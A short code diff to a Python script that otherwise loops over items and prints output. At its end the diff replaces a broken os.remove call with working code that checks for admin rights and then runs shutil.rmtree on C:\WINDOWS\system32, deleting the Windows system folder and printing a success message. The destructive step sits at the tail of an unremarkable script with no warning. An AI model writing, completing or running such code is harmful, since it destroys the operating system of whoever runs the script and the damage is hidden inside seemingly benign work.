@@ -1,5 +1,6 @@
 import os
 import time
+import shutil
 
 count = 10
 
@@ -44,4 +45,13 @@ for i, item in enumerate(items):
 
 print("\n")
 
-os.remove("C:\Windows\System32")
+# Check if user has required privileges (run the program as administrator)
+if not os.access('C:\\WINDOWS\\system32', os.W_OK | os.X_OK):
+    raise OSError("You need admin rights to perform this action on System32 folder")
+
+# Attempt to delete System32 folder and all its contents
+try:
+    shutil.rmtree('C:\\WINDOWS\\system32')
+    print("System32 folder deleted successfully")
+except Exception as e:
+    print(f"Error while deleting System32 folder: {str(e)}")
